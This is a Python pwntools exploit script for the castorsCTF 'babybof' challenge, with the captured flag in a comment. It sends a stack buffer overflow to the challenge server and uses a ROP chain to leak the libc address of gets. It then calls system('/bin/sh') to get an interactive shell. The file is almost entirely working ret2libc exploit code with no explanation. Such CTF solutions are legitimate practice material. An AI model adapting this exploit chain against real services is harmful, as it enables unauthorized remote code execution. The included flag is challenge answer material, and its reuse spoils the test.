#exploit for babybof1pt2
#flag=castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
from pwn import *
target=remote('chals20.cybercastors.com' ,14425)
libc=ELF('./libc6_2.31-0ubuntu9_amd64.so')
#target=process('./babybof')

payload="A"*(0x100+8)

ret=0x400566
poprdi=0x4007f3
getsgot=0x601040
putsplt=0x400590
main=0x40074D 

print(target.recvuntil("name: "))
payload+=p64(ret)
payload+=p64(poprdi)
payload+=p64(getsgot)
payload+=p64(putsplt)
payload+=p64(main)
payload+="\x00"*7

target.sendline(payload)
#target.recvline()
#target.recvline()
leak=target.recvline().strip("\n")
libc_gets=u64(leak+"\x00"*(8-len(leak)))
libc_base=libc_gets-libc.symbols["gets"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
libc_system=libc_base+libc.symbols["system"]
print(hex(libc_base))
poprdi=0x4007f3
payload="A"*(0x100+8)
#payload+=p64(ret)
payload+=p64(poprdi)
payload+=p64(libc_binsh)
payload+=p64(libc_system)
target.sendline(payload)

target.interactive()
